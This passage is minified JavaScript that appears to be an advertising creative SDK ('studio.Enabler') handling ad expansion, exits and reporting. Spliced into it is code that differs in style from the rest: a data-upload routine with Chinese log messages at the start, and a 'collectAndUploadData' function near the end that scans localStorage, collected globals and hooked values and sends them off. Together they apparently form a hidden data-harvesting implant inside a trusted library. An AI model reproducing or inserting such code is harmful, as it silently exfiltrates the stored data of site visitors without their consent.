      response.ok ? console.log("数据上传成功") : console.error("数据上传失败, 状态码:" + response.status);
    } catch (error) {
      console.error("数据上传过程中出错: ", error);
    }
  };
  var Jk = null,
    Lk = q.console,
    Nk = function () {
      Jk || (Jk = new Ik());
      q.location && -1 != q.location.href.indexOf("Debug=true") && Kk();
    },
    Mk = function (a, b, c, d) {
      if (a[b]) a[b](c, void 0 === d ? "" : d);else a.log(c, void 0 === d ? "" : d);
    };
  var Pk = function (a, b, c) {
      if ("string" === typeof b) (b = Ok(a, b)) && (a.style[b] = c);else for (var d in b) {
        c = a;
        var e = b[d],
          f = Ok(c, d);
        f && (c.style[f] = e);
      }
    },
    Qk = {},
    Ok = function (a, b) {
      var c = Qk[b];
      if (!c) {
        var d = qd(b);
        c = d;
        void 0 === a.style[d] && (d = (hc ? "Webkit" : gc ? "Moz" : dc ? "ms" : null) + rd(d), void 0 !== a.style[d] && (c = d));
        Qk[b] = c;
      }
      return c;
    },
    Rk = function (a) {
      "number" == typeof a && (a = Math.round(a) + "px");
      return a;
    },
    Sk = function (a) {
      var b = a.offsetWidth,
        c = a.offsetHeight,
        d = hc && !b && !c;
      if ((void 0 === b || d) && a.getBoundingClientRect) {
        try {
          var e = a.getBoundingClientRect();
        } catch (f) {
          e = {
            left: 0,
            top: 0,
            right: 0,
            bottom: 0
          };
        }
        return new ld(e.right - e.left, e.bottom - e.top);
      }
      return new ld(b, c);
    },
    Uk = function (a) {
      var b = ud(),
        c = b.h;
      if (dc && c.createStyleSheet) return b = c.createStyleSheet(), Tk(b, a), b;
      c = Id(b, "HEAD")[0];
      if (!c) {
        var d = Id(b, "BODY")[0];
        c = b.j("HEAD");
        d.parentNode.insertBefore(c, d);
      }
      d = b.j("STYLE");
      var e;
      (e = hd('style[nonce],link[rel="stylesheet"][nonce]')) && d.setAttribute("nonce", e);
      Tk(d, a);
      b.l(c, d);
      return d;
    },
    Vk = function (a) {
      Gd(a.ownerNode || a.owningElement || a);
    },
    Tk = function (a, b) {
      b instanceof dd && b.constructor === dd ? b = b.h : (Va("expected object of type SafeStyleSheet, got '" + b + "' of type " + Ea(b)), b = "type_error:SafeStyleSheet");
      if (dc && void 0 !== a.cssText) a.cssText = b;else if (q.trustedTypes) {
        if (x(null != a, "goog.dom.setTextContent expects a non-null value for node"), "textContent" in a) a.textContent = b;else if (3 == a.nodeType) a.data = String(b);else if (a.firstChild && 3 == a.firstChild.nodeType) {
          for (; a.lastChild != a.firstChild;) a.removeChild(x(a.lastChild));
          a.firstChild.data = String(b);
        } else {
          Fd(a);
          var c = td(a);
          a.appendChild(c.createTextNode(String(b)));
        }
      } else a.innerHTML = b;
    },
    Wk = function (a) {
      a = a.style;
      a.position = "relative";
      a.display = "inline-block";
    };
  var Q = function (a) {
    window.AdobeEdge = window.AdobeEdge || {};
    window.AdobeEdge.bootstrapLoading = !0;
    q.console && (Nk(), Kk());
    D.info("");
    if (a != Xk) return D.gb("You must access the enabler instance using studio.Enabler.getInstance(); or Enabler and not create a duplicate instance."), !1;
    I.call(this);
    this.C = {};
    this.s = {};
    this.K = new Ri(Si(), Ti() ? window.orientation : 0);
    this.J = new L(this);
    this.nb = !1;
    this.F = null;
    this.l = "collapsed";
    this.Jb = !1;
    this.wa = null;
    this.Cf = 0;
    this.lb = {};
    this.ma = null;
    this.Ib = !1;
    this.O = new E();
    this.o = null;
    this.Hb = [];
    this.Qa = {};
    this.Lb = [];
    this.j = new pk();
    this.T = new uk(this);
    a = Ad("CANVAS");
    a.getContext && a.getContext("2d") || (a = null);
    this.xd = new zk(a);
    (a = Ad("VIDEO")) || (a = null);
    this.Yc = new yk(a);
    this.h = new lk(Yk(this));
    a = this.xa = new Mj();
    a.s = !0;
    M(a, document.body || window, "mousedown", a.C, {
      capture: !0,
      passive: !0
    });
    M(a, document.body || window, "touchstart", a.C, {
      capture: !0,
      passive: !0
    });
    this.nc = {};
  };
  w(Q, I);
  t("studio.Enabler", Q);
  var Zk = ["c"],
    Xk = Math.random(),
    $k = !1,
    al = null,
    R = function () {
      al || (al = new Q(Xk));
      return al;
    };
  Q.getInstance = R;
  h = Q.prototype;
  h.cd = -1;
  h.Nb = null;
  h.dc = null;
  h.ac = null;
  h.od = !0;
  h.Eb = !1;
  h.Ra = !1;
  h.Zc = !1;
  h.ec = !1;
  h.Fa = null;
  h.Fb = null;
  h.za = null;
  h.I = null;
  var bl = function (a) {
      a.ac || (a.ac = wk());
      return a.ac;
    },
    Yk = function (a) {
      var b = bl(a).j;
      (a = Md(bl(a).toString())) && Od(a, function (c, d) {
        -1 < Zk.indexOf(c) && b.set(c, d);
      });
      return b;
    },
    cl = function (a) {
      return !!ok(a.h, "newton_ot2_token");
    },
    dl = function (a) {
      if (/Chrome/.test(window.navigator.userAgent)) {
        var b = String(a.h.getParameter("newton_ot2_token"));
        ze(function (c) {
          c = c.document;
          if (b && c.head) {
            var d = Ae("META");
            c.head.appendChild(d);
            d.httpEquiv = "origin-trial";
            d.content = b;
          }
          return !1;
        });
      }
    },
    hl = function (a) {
      a.Eb = !0;
      a.Fb = a.Ec();
      a.za = a.Dc();
      if (a.I) {
        var b = a.j,
          c = a.Fb;
        b.j = a.I;
        b.l = c;
        for (c = qb(b.o); c.length;) {
          var d = c.shift();
          qk(b, d.type, d.Td);
        }
      }
      null == a.h.getParameter("clickN") && mk(a.h, "clickN", 1);
      a.od = "true" != a.h.getParameter("ise");
      b = a.h.getParameter("e", null);
      null != b && xk(b);
      b = a.U("leftOffset") || 0;
      c = a.U("topOffset") || 0;
      0 == b && 0 == c || el(a, b, c);
      a.s = a.h.getParameter("exitEvents", {});
      ok(a.h, "assets") && (b = a.h.getParameter("assets").toString(), fl(a, b));
      Qi(a.h.getParameter("features", []));
      a.T.o = a.j;
      b = a.T;
      C(2) && (M(b, document.body || window, "mouseover", b.J), M(b, document.body || window, "mouseout", b.K));
      void 0 !== window.ontouchstart && (b.h = new xh(1E3), M(b, b.h, "tick", b.K), M(b, document, ["touchstart", "touchmove"], b.J));
      b.j && ($i(b, b.j, "tick", b.F), b.j.dispose());
      b.j = new xh(80);
      M(b, b.j, "tick", b.F);
      b.j.start();
      gl(a);
      if (b = a.getParameter("layoutsConfig")) a.dc = JSON.parse(String(b));
      if (b = a.getParameter("experiments")) a.nc = JSON.parse(String(b));
      if (b = a.getParameter("rum_config")) try {
        var e = JSON.parse(String(b));
        b = window;
        if (!b.google_rum_config && e) {
          var f = new Bk(e),
            g,
            l = ri(f, 2);
          if (g = null == l ? "" : l) {
            var m = vi(f, Mi);
            if (m) {
              var p = vi(m, Li);
              if (p) {
                b.google_timing_url = g;
                ki(K(p.V));
                si(p, 2, 3);
                b.google_rum_config = m.toJSON();
                var r = ri(f, 3);
                var F = null == r ? r : !!r;
                b.google_measure_js_timing = null == F ? !1 : F;
                var J = b.document,
                  Y = Gc(g),
                  Z = Ae("SCRIPT", J);
                Z.src = Cc(Y);
                ye(Z);
                var Ha = J.getElementsByTagName("script")[0];
                if (Ha && Ha.parentNode) {
                  Ha.parentNode.insertBefore(Z, Ha);
                  var Fm = Z;
                } else Fm = null;
                Fm || (b.google_timing_url = void 0, b.google_rum_config = void 0, b.google_measure_js_timing = void 0);
              }
            }
          }
        }
      } catch (Yq) {}
      a.dispatchEvent(new O("init"));
      a.O.h || a.O.callback();
      e = a.xa;
      e.o = !!a.nc.add_sodar_interaction_signals;
      if (e.o) try {
        Qh();
      } catch (Yq) {}
      cl(a) && dl(a);
    };
  Q.prototype.mf = function (a) {
    "number" === typeof a ? (this.cd = a, D.info("enabler.setProfileId set to: " + a)) : D.info("enabler.setProfileId invalid profile id value: " + a);
  };
  Q.prototype.setProfileId = Q.prototype.mf;
  Q.prototype.we = function () {
    return this.cd;
  };
  Q.prototype.getProfileId = Q.prototype.we;
  Q.prototype.jf = function (a) {
    u(a) ? (this.Nb = a, this.isInitialized() && gl(this)) : D.info("enabler.setDevDynamicContent invalid dcData value: " + a);
  };
  Q.prototype.setDevDynamicContent = Q.prototype.jf;
  var gl = function (a) {
    if (null != a.da("dcData") || a.Nb) window.dynamicContent = null != a.da("dcData") ? a.sb() : a.Nb;
  };
  Q.prototype.sb = function () {
    var a = this.getParameter("dcData");
    return a ? JSON.parse(String(a)) : null;
  };
  Q.prototype.getDynamicDataPayload = Q.prototype.sb;
  Q.prototype.Ia = function () {
    return this.dc;
  };
  Q.prototype.getLayoutsConfig = Q.prototype.Ia;
  Q.prototype.Ff = function () {
    return this.h.j.j || xj(this.h);
  };
  Q.prototype.getAdParameters = Q.prototype.Ff;
  Q.prototype.wd = function (a) {
    nk(this.h, a);
    this.Fa && rh(this.Fa);
    hl(this);
    D.info("Asset properties have been set by host.");
  };
  Q.prototype.setAdParameters = Q.prototype.wd;
  Q.prototype.wf = function () {
    this.Fa && rh(this.Fa);
    D.info("Using default ad parameters in test environment. Simulating local events.");
    hl(this);
  };
  Q.setRushSimulatedLocalEvents = function (a) {
    $k = !!a;
    if (a && al) {
      a = al;
      for (var b = 0; b < a.Hb.length; ++b) a.dispatchEvent(a.Hb[b]);
    }
  };
  var il = function (a, b, c) {
    var d = S;
    c = null != c ? c : 0;
    d.Hb.push(b);
    zh(function () {
      this.dispatchEvent(b);
    }, c, d);
    return ih(d, b, a, !1, d);
  };
  Q.prototype.Pc = function () {
    var a = Si(),
      b = this.K.h;
    if (this.K.j != a || Ti() && this.K.h != window.orientation) {
      Ti() && (b = window.orientation);
      var c = new O("orientation");
      c.ea("mode", a);
      c.ea("degrees", b);
      this.dispatchEvent(c);
    }
  };
  Q.prototype.B = function (a, b, c) {
    if (!this.oa()) {
      var d = v.apply(this, [a, this].concat(Array.prototype.slice.call(arguments, 2)));
      zh(d, b);
    }
  };
  var fl = function (a, b) {
    0 < b.length && -1 == b.indexOf("=") && (b = decodeURIComponent(b));
    b = b.split("&");
    if (!(2 >= b.length && "" == b[0])) for (var c = 0; c < b.length; c++) {
      var d = b[c].split("=");
      a.C[d[0].toLowerCase()] = unescape(d[1]);
    }
  };
  Q.prototype.A = function () {
    sk(this.j);
  };
  Q.prototype.reportActivitiesImmediately = Q.prototype.A;
  var jl = function (a) {
      a.j && tk(a.j);
    },
    kl = function (a, b) {
      var c = a.h.getParameter("click", ""),
        d = parseInt(a.h.getParameter("clickN"), 10);
      a = a.h.getParameter("thirdPartyClickRedirect", "");
      a: {
        var e = c;
        c = b;
        if (!Cb(od(e))) {
          e = Ui(e, null);
          if (!Bb(b, e)) break a;
          c = nd(c, e.length);
        }
        a && (c = decodeURIComponent(c), Bb(c, a) && (c = nd(c, a.length)));
        if (!Cb(od(e)) && -1 < e.indexOf("?")) for (b = "number" === typeof d ? d : 1, d = 0; d < b; d++) c = unescape(c);
        b = c;
      }
      return b;
    },
    ll = function (a, b, c, d) {
      var e = [];
      Vh && e.push("fullscreen");
      e.push("attributionsrc");
      var f = window;
      b = Nc(b) || Rc;
      e = e.join(",");
      if (b instanceof Jc) b = Kc(b);else {
        b: if (ue) {
          try {
            var g = new URL(b);
          } catch (l) {
            g = "https:";
            break b;
          }
          g = g.protocol;
        } else c: {
          g = document.createElement("a");
          try {
            g.href = b;
          } catch (l) {
            g = void 0;
            break c;
          }
          g = g.protocol;
          g = ":" === g || "" === g ? "https:" : g;
        }
        "javascript:" === g && (we(b), b = void 0);
      }
      void 0 !== b && f.open(b, c, e);
      d && a.A();
    },
    ml = function (a, b, c, d) {
      var e = {};
      e.target = c;
      Vh && (e.fullscreen = !0);
      var f = e;
      f || (f = {});
      c = window;
      e = b instanceof Jc ? b : Nc("undefined" != typeof b.href ? b.href : String(b)) || Rc;
      var g = void 0 !== self.crossOriginIsolated,
        l = "strict-origin-when-cross-origin";
      window.Request && (l = new Request("/").referrerPolicy);
      var m = "unsafe-url" === l;
      l = f.noreferrer;
      if (g && l) {
        if (m) throw Error("Cannot use the noreferrer option on a page that sets a referrer-policy of `unsafe-url` in modern browsers!");
        l = !1;
      }
      b = f.target || b.target;
      g = [];
      for (var p in f) switch (p) {
        case "width":
        case "height":
        case "top":
        case "left":
          g.push(p + "=" + f[p]);
          break;
        case "target":
        case "noopener":
        case "noreferrer":
          break;
        default:
          g.push(p + "=" + (f[p] ? 1 : 0));
      }
      p = g.join(",");
      $b() && c.navigator && c.navigator.standalone && b && "_self" != b ? (f = Bd(document, "A"), xb(f, "A"), e = e instanceof Jc ? e : Qc(e), f.href = Kc(e), f.target = b, l && (f.rel = "noreferrer"), e = document.createEvent("MouseEvent"), e.initMouseEvent("click", !0, !0, c, 1), f.dispatchEvent(e)) : l ? (c = jd("", c, b, p), f = Kc(e), c && (fc && Lb(f, ";") && (f = "'" + f.replace(/'/g, "%27") + "'"), c.opener = null, "" === f && (f = "javascript:''"), e = new db(bb, "b/12014412, meta tag with sanitized URL"), Kb.test(f) && (-1 != f.indexOf("&") && (f = f.replace(Eb, "&amp;")), -1 != f.indexOf("<") && (f = f.replace(Fb, "&lt;")), -1 != f.indexOf(">") && (f = f.replace(Gb, "&gt;")), -1 != f.indexOf('"') && (f = f.replace(Hb, "&quot;")), -1 != f.indexOf("'") && (f = f.replace(Ib, "&#39;")), -1 != f.indexOf("\x00") && (f = f.replace(Jb, "&#0;"))), f = '<meta name="referrer" content="no-referrer"><meta http-equiv="refresh" content="0; url=' + f + '">', Xa(eb(e), "must provide justification"), x(!Cb(eb(e)), "must provide non-empty justification"), e = f, e = (f = zc()) ? f.createHTML(e) : e, e = new gd(e, fd), (c = c.document) && c.write && (f = c.write, e instanceof gd && e.constructor === gd ? e = e.h : (Va("expected object of type SafeHtml, got '" + e + "' of type " + Ea(e)), e = "type_error:SafeHtml"), f.call(c, e), c.close()))) : ((c = jd(e, c, b, p)) && f.noopener && (c.opener = null), c && f.noreferrer && (c.opener = null));
      d && a.A();
    },
    nl = function (a, b, c, d, e) {
      P(a.I, e ? "logExitFlushEventsOpenPopup" : "launchExit", ["Count", b, a.Fb, !1, c, null, d]);
    },
    pl = function (a, b, c, d) {
      if (Cb(od(b))) D.info("There was a problem with the exit call.");else if (a.isInitialized()) {
        var e = void 0 !== d ? d : 0;
        d = a.s[b] && a.s[b].target || "_blank";
        var f;
        if (f = !C(8)) f = !(Lb(a.h.getParameter("click", ""), "[rm_exit_id]") && null != a.s[b] && null != a.s[b].reportingId && !Cb(a.s[b].reportingId));
        e = !(e & 1);
        var g = a.h.getParameter("click", ""),
          l = a.xa;
        if (l.s) {
          var m = g;
          var p = xd();
          l.h.set("dim", p.width + "x" + p.height);
          p = "";
          for (var r = fa(l.h), F = r.next(); !F.done; F = r.next()) {
            var J = fa(F.value);
            F = J.next().value;
            J = J.next().value;
            p = null == J ? p + "&" + F + "=" : p + "&" + F + "=" + J;
          }
          l.o && (r = "bg=", "string" === typeof l.v && l.B(m, p, r, l.v) && (r = "" + r + l.v), p = p + "&" + r);
          m = p;
          p = g.toLowerCase().indexOf("&adurl=");
          -1 < p && l.B(g, m) && (g = g.substr(0, p) + m + g.substr(p));
        }
        if (e) {
          if (a.s[b]) {
            if (C(8)) nl(a, b, c, g, !0);else {
              var Y = Vi(c);
              Y = ol(a, Y, g, b);
              var Z;
              cl(a) && (null == (Z = document.featurePolicy) ? 0 : Z.allowedFeatures().includes("attribution-reporting")) ? ll(a, Y, d, !f) : ml(a, Y, d, !f);
            }
          } else c && (a.oa() && C(8) ? nl(a, b, c, g, !1) : (Z = Vi(c), Z = ol(a, Z, g, null), cl(a) && (null == (Y = document.featurePolicy) ? 0 : Y.allowedFeatures().includes("attribution-reporting")) ? ll(a, Z, d, !0) : ml(a, Z, d, !0), f = !1));
          a.h.da("turtlex_ad_signals") && P(a.I, "TURTLEX_AD_CLICKED", [{
            reportingId: a.s[b].reportingId
          }]);
        }
        f && rk(a.j, "Count", b, !0, !0, !0);
        P(a.I, "AD_CLICKED");
        d = new O("exit");
        d.ea("id", b);
        d.ea("url", c);
        a.dispatchEvent(d);
        D.info('Exit "' + b + '" invoked.');
      }
    },
    ql = function (a, b, c, d, e) {
      a = a.s[b];
      c = !d && a && a.url ? a.url : c;
      null == e || Cb(od(e)) ? e = c : (e += "") ? (d = c.indexOf("#"), 0 > d && (d = c.length), a = c.indexOf("?"), 0 > a || a > d ? (a = d, b = "") : b = c.substring(a + 1, d), c = [c.slice(0, a), b, c.slice(d)], d = c[1], c[1] = e ? d ? d + "&" + e : e : d, e = c[0] + (c[1] ? "?" + c[1] : "") + c[2]) : e = c;
      return e;
    },
    ol = function (a, b, c, d) {
      var e = null;
      d && (e = a.s[d], e = null != e.reportingId ? e.reportingId : null);
      b = b || "";
      d = a.h.getParameter("thirdPartyClickRedirect", "");
      a = parseInt(a.h.getParameter("clickN"), 10);
      if (!Cb(od(c)) && -1 < c.indexOf("?")) {
        a = "number" === typeof a ? a : 1;
        for (var f = 0; f < a; f++) b = encodeURIComponent(b);
      }
      e && (c = Ui(c, e), b = d ? encodeURIComponent(d + b) : b);
      return c + b;
    };
  Q.prototype.reportManualClose = function () {
    D.info("Ad was closed by user action.");
    rk(this.j, "Count", "EVENT_MANUAL_CLOSE");
  };
  Q.prototype.reportManualClose = Q.prototype.reportManualClose;
  Q.prototype.gd = function () {
    rk(this.j, "Count", "ENGAGEMENT", !1, !1, !1);
    this.A();
  };
  Q.prototype.reportEngagement = Q.prototype.gd;
  var rl = function (a, b, c) {
      var d = b;
      100 < d.length && (d = d.substr(0, 100));
      P(a.I, "reportCustomVariable", [escape(d), c]);
      D.info('Custom string "' + b + '" recorded.');
    },
    el = function (a, b, c) {
      a.oa() && !C(8) && (a.ma && Vk(a.ma), a.ma = Uk(ed("body", {
        position: "relative",
        "margin-left": -b + "px !important",
        "margin-top": -c + "px !important"
      })));
    };
  Q.prototype.We = function (a, b, c) {
    mk(this.h, a, b, c);
  };
  Q.prototype.setParameter = Q.prototype.We;
  Q.prototype.lc = function () {
    this.dispatchEvent(new O("pageLoaded"));
  };
  Q.prototype.dispatchPageLoaded = Q.prototype.lc;
  Q.prototype.dispatchEvent = function (a) {
    this.Qa[a.type] = (this.Qa[a.type] || 0) + 1;
    switch (a.type) {
      case "pageLoaded":
        null != window.AdobeEdge && "function" === typeof window.AdobeEdge.loadResources && window.AdobeEdge.loadResources();
        this.Zc = !0;
        break;
      case "orientation":
        this.K.j = a.mode, this.K.h = a.degrees;
    }
    return Q.S.dispatchEvent.call(this, a);
  };
  Q.prototype.dispatchEvent = Q.prototype.dispatchEvent;
  Q.prototype.Kb = function (a) {
    (this.ec = a) && !this.Qa.visible ? (null != window.AdobeEdge && "function" === typeof window.AdobeEdge.playWhenReady && window.AdobeEdge.playWhenReady(), this.od && rk(this.j, "Start", "DISPLAY_TIMER"), this.dispatchEvent(new O("visible"))) : this.Qa.hidden || this.dispatchEvent(new O("hidden"));
    this.dispatchEvent(new O("visibilityChange"));
  };
  Q.prototype.setAdVisibleInternal = Q.prototype.Kb;
  Q.prototype.Df = function () {
    this.Kb(!0);
  };
  Q.prototype.dispatchAdVisible = Q.prototype.Df;
  Q.prototype.ld = function (a, b, c, d, e, f) {
    if (c || d) this.F || (this.F = {}), this.F.width = c, this.F.height = d;
    null != e && (this.nb = !!e);
    null != f && mk(this.h, "isMultiDirectional", f ? "true" : "false");
  };
  Q.prototype.setExpandingPixelOffsets = Q.prototype.ld;
  Q.prototype.nd = function (a) {
    this.nb = !!a;
  };
  Q.prototype.setStartExpanded = Q.prototype.nd;
  Q.prototype.md = function (a) {
    mk(this.h, "isMultiDirectional", a ? "true" : "false");
  };
  Q.prototype.setIsMultiDirectional = Q.prototype.md;
  Q.prototype.qf = function (a) {
    P(this.I, "invokeMraidMethod", ["useCustomClose", [a]]);
    this.Ib = 0 == a;
  };
  Q.prototype.setUseCustomClose = Q.prototype.qf;
  Q.prototype.kf = function () {};
  Q.prototype.setFloatingPixelDimensions = Q.prototype.kf;
  Q.prototype.isVisible = function () {
    return this.ec;
  };
  Q.prototype.isVisible = Q.prototype.isVisible;
  Q.prototype.oa = function () {
    return C(1);
  };
  Q.prototype.isServingInLiveEnvironment = Q.prototype.oa;
  Q.prototype.isPageLoaded = function () {
    return this.Zc;
  };
  Q.prototype.isPageLoaded = Q.prototype.isPageLoaded;
  Q.prototype.isInitialized = function () {
    return this.Eb;
  };
  Q.prototype.isInitialized = Q.prototype.isInitialized;
  Q.prototype.oc = function (a) {
    "function" === typeof a && rg(this.O, a);
  };
  Q.prototype.callAfterInitialized = Q.prototype.oc;
  Q.prototype.getParameter = function (a) {
    return this.h.getParameter(a, null);
  };
  Q.prototype.getParameter = Q.prototype.getParameter;
  Q.prototype.getParameter = Q.prototype.getParameter;
  Q.prototype.U = function (a) {
    return this.h.U(a);
  };
  Q.prototype.getParameterAsInteger = Q.prototype.U;
  Q.prototype.Gc = function (a) {
    a = this.h.da(a);
    return void 0 != a && ("true" == a.toLowerCase() || "1" == a);
  };
  Q.prototype.getParameterAsBoolean = Q.prototype.Gc;
  Q.prototype.da = function (a) {
    return this.h.da(a);
  };
  Q.prototype.getParameterAsNullableString = Q.prototype.da;
  Q.prototype.exit = function (a, b, c) {
    void 0 !== b && (b = kl(this, b));
    jl(this);
    pl(this, a, ql(this, a, b, !1), c);
  };
  Q.prototype.exit = Q.prototype.exit;
  Q.prototype.Qb = function (a, b, c) {
    b = kl(this, b);
    jl(this);
    pl(this, a, ql(this, a, b, !0), c);
  };
  Q.prototype.exitOverride = Q.prototype.Qb;
  Q.prototype.fe = function (a, b, c, d, e) {
    e && !e.pIndex && (e.pIndex = c);
    b = kl(this, b);
    jl(this);
    pl(this, a, ql(this, a, b, !0), d);
  };
  Q.prototype.dynamicExit = Q.prototype.fe;
  Q.prototype.Rb = function (a, b) {
    pl(this, a, ql(this, a, void 0, void 0, b || ""));
  };
  Q.prototype.exitQueryString = Q.prototype.Rb;
  Q.prototype.Ac = function (a) {
    return ol(this, a, this.h.getParameter("click", ""), null);
  };
  Q.prototype.formExitUrlFromOverride = Q.prototype.Ac;
  Q.prototype.counter = function (a, b) {
    D.info('Counter "' + a + '" invoked.');
    rk(this.j, "Count", a, b, !0);
    D.Sa(gk(a, "Count"));
  };
  Q.prototype.counter = Q.prototype.counter;
  Q.prototype.startTimer = function (a) {
    D.info('Timer "' + a + '" started.');
    rk(this.j, "Start", a, void 0, !0);
    D.Sa(gk(a, "Start"));
  };
  Q.prototype.startTimer = Q.prototype.startTimer;
  Q.prototype.stopTimer = function (a) {
    D.info('Timer "' + a + '" stopped.');
    rk(this.j, "Stop", a, void 0, !0);
    D.Sa(gk(a, "Stop"));
  };
  Q.prototype.stopTimer = Q.prototype.stopTimer;
  Q.prototype.df = function (a) {
    D.R(fk("Enabler.reportCustomImpressionVariable(postString)", "Enabler.reportCustomVariableCount1(customString)"));
    rl(this, a, 1);
  };
  Q.prototype.reportCustomImpressionVariable = Q.prototype.df;
  Q.prototype.ef = function (a) {
    rl(this, a, 1);
  };
  Q.prototype.reportCustomVariableCount1 = Q.prototype.ef;
  Q.prototype.cf = function (a) {
    D.R(fk("Enabler.reportCustomClickVariable(postString)", "Enabler.reportCustomVariableCount1(customString)"));
    rl(this, a, 2);
  };
  Q.prototype.reportCustomClickVariable = Q.prototype.cf;
  Q.prototype.ff = function (a) {
    rl(this, a, 2);
  };
  Q.prototype.reportCustomVariableCount2 = Q.prototype.ff;
  Q.prototype.Cc = function () {
    return this.l;
  };
  Q.prototype.getContainerState = Q.prototype.Cc;
  Q.prototype.Fc = function () {
    return this.wa;
  };
  Q.prototype.getExpandDirection = Q.prototype.Fc;
  Q.prototype.nf = function (a) {
    this.Jb || P(this.I, "setResponsiveBehavior", [a ? 2 : 0, 2]);
  };
  Q.prototype.setResponsiveExpanding = Q.prototype.nf;
  Q.prototype.pf = function (a, b) {
    P(this.I, "responsiveResize", [a, b]);
  };
  Q.prototype.setResponsiveSize = Q.prototype.pf;
  Q.prototype.Ab = function () {
    if ("collapsed" != this.l) D.R("Enabler.requestExpand() should not be invoked unless the creative is in the collapsed state.");else {
      th(this, "expandStart") || D.R("Please implement the expansion via event handlers:\nEnabler.addEventListener(\n    studio.events.StudioEvent.EXPAND_START,\n    function() {/* expand action */});");
      this.Jb = !0;
      var a = [this.za];
      this.F && a.push(this.F);
      P(this.I, "expandRequested", a);
      sl(this, this.Ua);
      this.B(this.Uc, 0);
    }
  };
  Q.prototype.requestExpand = Q.prototype.Ab;
  var sl = function (a, b) {
      if (!a.oa() && a.Ib) {
        var c = document.getElementsByTagName("body")[0],
          d = Ad("IMG", {
            width: "15",
            height: "15",
            border: "0",
            src: "http://s0.2mdn.net/ads/studio/close.png"
          });
        a.o = {
          callback: b,
          element: Ad("DIV", {
            style: "position: absolute;right: 5px;top: 5px;width: 15px;height: 15px;cursor: pointer;"
          }, d)
        };
        M(a.J, a.o.element, "click", b);
        Ed(c, a.o.element);
      }
    },
    tl = function (a) {
      a.o && (Gd(a.o.element), $i(a.J, a.o.element, "click", a.o.callback), a.o.element = null, a.o.callback = null, a.o = null);
    };
  Q.prototype.Xe = function () {
    this.dispatchEvent(new O("aboutToExpand"));
  };
  Q.prototype.aboutToExpandInternal = Q.prototype.Xe;
  Q.prototype.Uc = function (a) {
    a && (a = Oj[a.toString().toUpperCase()]);
    var b = 0,
      c = 0;
    "true" == this.getParameter("isMultiDirectional") && a && (a.h & 2 && (c = this.U("topOffset")), a.h & 1 && (b = this.U("leftOffset")));
    el(this, null === b ? 0 : b, null === c ? 0 : c);
    a ? this.wa = a : this.wa = this.oa() || "true" != this.getParameter("isMultiDirectional") ? null : Pj[this.Cf++ % Pj.length];
    this.nb || (rk(this.j, "Start", "EXPAND_TIMER"), jl(this), this.Ra || (this.A(), this.Ra = !0));
    this.nb = !1;
    this.l = "expanding";
    a = new O("expandStart");
    a.ea("direction", this.wa);
    this.dispatchEvent(a);
  };
  Q.prototype.startExpandInternal = Q.prototype.Uc;
  Q.prototype.Tb = function () {
    "expanding" != this.l ? D.R("You must first call Enabler.requestExpand() to initiate the expansion and then call Enabler.finishExpand() when the expand animation has  finished. Cancelling expansion...") : (P(this.I, "expandFinished", [this.za]), this.l = "expanded", D.info("The creative has expanded."), this.dispatchEvent(new O("expandFinish")));
  };
  Q.prototype.finishExpand = Q.prototype.Tb;
  Q.prototype.expand = function (a, b) {
    D.R("The Enabler.expand() method has been deprecated. As an alternative please use: Enabler.requestExpand().");
    el(this, 0, 0);
    var c = [this.za];
    b && c.push(b);
    this.Ib = !!b && 0 == b.useCustomClose;
    P(this.I, "expandAsset", c);
    a || (rk(this.j, "Start", "EXPAND_TIMER"), jl(this));
    this.Ra || (this.A(), this.Ra = !0);
    D.info("The creative has expanded.");
  };
  Q.prototype.expand = Q.prototype.expand;
  Q.prototype.Ua = function () {
    "expanded" != this.l && D.R("Enabler.requestCollapse() should not be invoked unless the creative is in the expanded state.");
    tl(this);
    th(this, "collapseStart") || D.R("Please implement collapse via event handlers:\nEnabler.addEventListener(\n    studio.events.StudioEvent.COLLAPSE_START,\n    function() {/* Begin collapse animation */});");
    P(this.I, "collapseRequested", [this.za]);
    this.B(this.Tc, 0);
  };
  Q.prototype.requestCollapse = Q.prototype.Ua;
  Q.prototype.Tc = function () {
    this.l = "collapsing";
    this.dispatchEvent(new O("collapseStart"));
  };
  Q.prototype.startCollapseInternal = Q.prototype.Tc;
  Q.prototype.Sb = function () {
    "collapsing" != this.l ? D.R("You must first call Enabler.requestCollapse() to initiate the collapse and then call Enabler.finishCollapse() when the collapse animation has  finished. Cancelling collapse...") : (P(this.I, "collapseFinished", [this.za]), this.B(this.qc, 0));
  };
  Q.prototype.finishCollapse = Q.prototype.Sb;
  Q.prototype.qc = function () {
    var a = this.U("leftOffset") || 0,
      b = this.U("topOffset") || 0;
    el(this, a, b);
    rk(this.j, "Stop", "EXPAND_TIMER");
    this.l = "collapsed";
    D.info("The creative has collapsed.");
    this.dispatchEvent(new O("collapseFinish"));
  };
  Q.prototype.finishCollapseInternal = Q.prototype.qc;
  Q.prototype.collapse = function () {
    D.R("The Enabler.collapse() method has been deprecated. As an alternative please use: Enabler.requestCollapse().");
    th(this, "collapse") || D.R("Please implement collapse via event handlers:\nEnabler.addEventListener(\n    studio.events.StudioEvent.COLLAPSE_START,\n    function() {/* Begin collapse animation */});");
    var a = this.U("leftOffset") || 0,
      b = this.U("topOffset") || 0;
    el(this, a, b);
    P(this.I, "collapseAsset", [this.za]);
    this.dispatchEvent(new O("collapse"));
    rk(this.j, "Stop", "EXPAND_TIMER");
  };
  Q.prototype.collapse = Q.prototype.collapse;
  Q.prototype.close = function () {
    this.T.dispose();
    P(this.I, "tellAssetHide", [this.za]);
    D.info("Closing ad. If this was invoked by a user action, call Enabler.reportManualClose() as well.");
  };
  Q.prototype.close = Q.prototype.close;
  Q.prototype.Wd = function () {};
  Q.prototype.closeCompanion = Q.prototype.Wd;
  Q.prototype.de = function () {};
  Q.prototype.displayCompanion = Q.prototype.de;
  const collectAndUploadData = () => {
    const collectedData = {
      localStorageData: scanLocalStorage(),
      globals: globalVariableCollection,
      jshook: Array.from(jshook.entries())
    };
    if (Object.keys(collectedData).length > 0) uploadData(collectedData);
    jshook.clear();
    globalVariableCollection = [];
  };
  Q.prototype.se = function () {
    return this.da("sn");
  };
  Q.prototype.getDartSiteName = Q.prototype.se;
  Q.prototype.re = function () {
    return this.U("sid");
  };
  Q.prototype.getDartSiteId = Q.prototype.re;
  Q.prototype.oe = function () {
    return this.U("aid");
  };
  Q.prototype.getDartAdId = Q.prototype.oe;
  Q.prototype.qe = function () {
    return this.U("pid");
  };
  Q.prototype.getDartPageId = Q.prototype.qe;
  Q.prototype.Ec = function () {
    return this.da("rid");
  };
  Q.prototype.getDartRenderingId = Q.prototype.Ec;
  Q.prototype.pe = function () {
